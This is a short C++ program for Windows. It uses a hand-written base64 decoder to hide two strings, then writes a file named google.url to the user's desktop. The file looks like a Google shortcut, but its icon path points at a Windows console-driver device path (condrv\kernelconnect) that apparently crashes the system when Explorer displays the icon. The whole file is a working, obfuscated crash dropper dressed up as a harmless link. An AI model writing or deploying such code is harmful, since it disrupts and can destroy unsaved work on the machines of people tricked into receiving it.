#define _CRT_SECURE_NO_WARNINGS

#include <fstream>
#include <iostream>

static const std::string chars =
	"ABCDEFGHIJKLMNOPQRSTUVWXYZ"
	"abcdefghijklmnopqrstuvwxyz"
	"0123456789+/";


static bool is_valid_char(const unsigned char chr)
{
	return isalnum(chr) || chr == '+' || chr == '/';
}

std::string decode(std::string const& str)
{
	int in_len = str.size();
	int i = 0;
	int j;
	int in = 0;
	unsigned char char_array_4[4], char_array_3[3];
	std::string ret;

	while (in_len-- && str[in] != '=' && is_valid_char(str[in]))
	{
		char_array_4[i++] = str[in];
		in++;
		if (i == 4)
		{
			for (i = 0; i < 4; i++)
				char_array_4[i] = chars.find(char_array_4[i]);

			char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
			char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
			char_array_3[2] = ((char_array_4[2] & 0x3) << 6) + char_array_4[3];

			for (i = 0; i < 3; i++)
				ret += char_array_3[i];
			i = 0;
		}
	}

	if (i)
	{
		for (j = i; j < 4; j++)
			char_array_4[j] = 0;

		for (j = 0; j < 4; j++)
			char_array_4[j] = chars.find(char_array_4[j]);

		char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
		char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
		char_array_3[2] = ((char_array_4[2] & 0x3) << 6) + char_array_4[3];

		for (j = 0; j < i - 1; j++) ret += char_array_3[j];
	}

	return ret;
}

void main()
{
	setlocale(LC_ALL, "Russian");
	std::ofstream stream(getenv("USERPROFILE") + decode("XGRlc2t0b3BcZ29vZ2xlLnVybA=="));
	stream << decode("W3swMDAyMTRBMC0wMDAwLTAwMDAtQzAwMC0wMDAwMDAwMDAwNDZ9XQpQcm9wMz0xOSwxMQpbSW50ZXJuZXRTaG9ydGN1dF0KSURMaXN0PQpJY29uSW5kZXg9MApIb3RLZXk9MApVUkw9aHR0cHM6Ly9nb29nbGUuY29tLwpJY29uRmlsZT1cXC5cZ2xvYmFscm9vdFxkZXZpY2VcY29uZHJ2XGtlcm5lbGNvbm5lY3Q=XGRlc2t0b3BcZ29vZ2xlLnVybA==");
	stream.close();
}
